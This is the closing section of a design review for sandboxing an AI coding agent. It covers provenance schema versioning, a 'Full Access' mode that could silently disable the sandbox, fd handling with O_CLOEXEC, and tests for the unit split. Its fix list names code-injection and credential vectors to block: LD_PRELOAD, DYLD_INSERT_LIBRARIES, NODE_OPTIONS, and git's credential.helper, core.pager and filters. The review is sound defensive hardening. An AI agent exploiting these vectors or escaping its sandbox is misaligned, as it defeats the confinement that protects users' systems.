## Cross-Cutting Concerns the Plan Does Not Address

### X1. Provenance schema migration across units

Unit 1 writes provenance records with a single-root model. Unit 2 introduces multi-root and a `sandbox_backend` field in `session.start`. Unit 3 adds a macOS backend value. What happens when a user resumes a Unit-1 session after upgrading to Unit 2? The plan says Unit 1 does not import resume/root-identity changes, but it does not say whether Unit 2's resume logic must tolerate Unit-1 provenance records. Specify a schema version field in the provenance header and a migration path, or explicitly state that sessions do not survive across unit boundaries (acceptable if documented).

### X2. The "Full Access" mode interaction

The plan keeps host mode "under Full Access only." But Full Access is described as an existing permission level. Does Full Access today mean "skip all prompts" or "auto-approve but still sandbox"? If it means "skip all prompts," then host mode under Full Access means unsandboxed, unprompted execution—which is the same as the removed host mode with a different gate. Clarify that Full Access auto-approves *permission prompts* but does not disable the sandbox. The sandbox is a confinement mechanism, not a permission mechanism. If a user wants unsandboxed execution, that should be a separate, explicitly-named flag (`--no-sandbox`) with a warning, not a side effect of Full Access.

### X3. Concurrent agent turns and fd lifetime

The fd-anchored write model (Unit 1) holds an open file descriptor between prepare and apply. If the agent runs multiple tool calls concurrently (e.g., two file edits in parallel), the plan does not specify whether fds are per-turn or per-session, or what happens if the process is checkpointed/restored while fds are open. On Linux, fds do not survive `execve` unless `O_CLOEXEC` is *not* set—but the plan uses `O_NOFOLLOW` and `O_EXCL`, not `O_CLOEXEC`. Confirm that all fds are opened with `O_CLOEXEC` to prevent leaking them into sandboxed child processes.

### X4. Testing the split boundary itself

The plan describes what goes into each unit but not how to test that the boundary is clean. Require:
- After Unit 1 lands, the full test suite (including existing shell/sandbox tests) must pass with shell tests gated behind `#[cfg(feature = "sandbox")]` or equivalent, so that Unit 1 does not accidentally break sandbox-dependent tests.
- After Unit 2 lands, a bisection test: check out Unit 1's tip, run the test suite, check out Unit 2's tip, run the test suite. Any test that passes on Unit 2 but fails on Unit 1 must be a test that Unit 2 added, not a test that Unit 1 broke.

---

## Summary of Required Changes Before This Plan Is Ready

| # | Item | Severity |
|---|------|----------|
| 1 | F36 fix needs two-phase checkpoint status (`prepared`/`applied`) | Medium |
| 2 | Allowlist fixes are a hard ancestor gate, not "before or with" | High |
| 3 | `NODE_OPTIONS` must be sanitized or moved to Tier 2; `LD_PRELOAD`/`DYLD_INSERT_LIBRARIES` explicitly denied | High |
| 4 | Network grant should be per-command, not per-session; no blanket "always" in Unit 2 | Medium |
| 5 | Snapshot truncation must be visible to the agent's reasoning loop, not just provenance | High |
| 6 | Git config disabling must cover `.gitattributes` filters, `core.pager`, `credential.helper`, `include.path` | High |
| 7 | Full Access must not implicitly disable the sandbox | High |
| 8 | All fds opened with `O_CLOEXEC` | Medium |
| 9 | Bubblewrap probe at startup with `--check-sandbox` flag | Low |
| 10 | Provenance schema versioning across units | Medium |
| 11 | Unit 3 scoped as investigation, not committed to Seatbelt | Low |
| 12 | Intermediate-directory symlink test for O_NOFOLLOW path | Medium |

The plan's instincts are correct—split the PR, be honest about macOS, don't block on snapshot overflow—but the execution details in items 2, 3, 5, 6, and 7 above would each leave a exploitable gap if shipped as written. Address those before cutting the Unit 1 branch.
